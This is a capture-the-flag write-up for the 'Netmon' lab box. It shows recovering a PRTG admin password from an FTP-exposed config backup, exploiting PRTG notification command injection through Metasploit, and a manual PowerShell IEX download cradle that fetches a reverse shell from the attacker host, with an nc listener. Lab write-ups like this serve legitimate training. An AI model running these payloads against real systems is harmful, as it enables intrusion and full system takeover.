## Box: Netmon

## Target IP: `10.10.10.152`

---

### Initial Nmap Scan

Ran:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.10.10.152
```

Results:

| Port | Service | Version |
| --- | --- | --- |
| 21 | ftp | Microsoft ftpd (anonymous login allowed) |
| 80 | http | Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds |

---

### FTP Access

Logged in anonymously.

Navigated to `C:\Users\Public\Desktop`.

Grabbed user flag:

```
[REDACTED]
```

---

### Web Server Enumeration

Found PRTG Network Monitor running on port 80.

Version:

```
18.1.37.13946

```

Checked default config storage.

Located config files at:

```
/ProgramData/Paessler/PRTG Network Monitor/
```

Downloaded configuration files through FTP.

Searched passwords:

```bash
grep -B5 -A5 -i pass PRTG\ Configuration.old.bak | sed 's/ //g' | sort -u | less
```

Found:

```
<dbpassword>
<!-- User: prtgadmin -->
PrTg@dmin2018
</dbpassword>
```

---

### Authentication

Tried `PrTg@dmin2018`. Failed.

Realized year probably incremented.

Tried `PrTg@dmin2019`. Success.

Logged into the web interface.

---

### Exploitation

**Method 1: Metasploit**

Fired up Metasploit:

```bash
msfconsole
```

Loaded:

```bash
use exploit/windows/http/prtg_authenticated_rce
```

Set options:

```bash
set admin_password PrTg@dmin2019
set rhost 10.10.10.152
set lhost tun0
exploit
```

Immediate Meterpreter shell.

---

**Method 2: Manual**

Followed manual method from [this article](https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/).

Used the Notification system command injection.

Tested with:

```bash
test text; ping -n 1 10.10.14.15
```

Confirmed ICMP packet via:

```bash
sudo tcpdump -i tun0 icmp
```

Success.

Generated a PowerShell reverse shell via [revshells.com](http://revshells.com/).

Saved as `reverse.ps1`, hosted it:

```bash
python3 -m http.server 80
```

Started listener:

```bash
nc -lvnp 4444
```

In Notification system, injected:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/reverse.ps1')
```

Executed.

Caught second shell.

---

### Privilege Escalation

No escalation needed.

Already `NT AUTHORITY\SYSTEM`.

Confirmed:

```bash
whoami
```

Output:

```
nt authority\system
```

---

### Root Flag

Grabbed:

```
[REDACTED]
```
